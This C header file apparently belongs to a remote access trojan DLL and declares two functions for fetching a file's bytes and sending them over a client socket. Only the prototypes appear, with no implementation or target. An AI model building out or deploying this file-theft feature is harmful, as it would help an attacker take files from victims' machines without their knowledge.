#pragma once

#include "RAT-Dll-Main.h"

INT handleGetFile(SOCKET clientSock);
INT performGetFile(__in const char* filePath, __out char** fileBytes, __out DWORD* bufferSize);

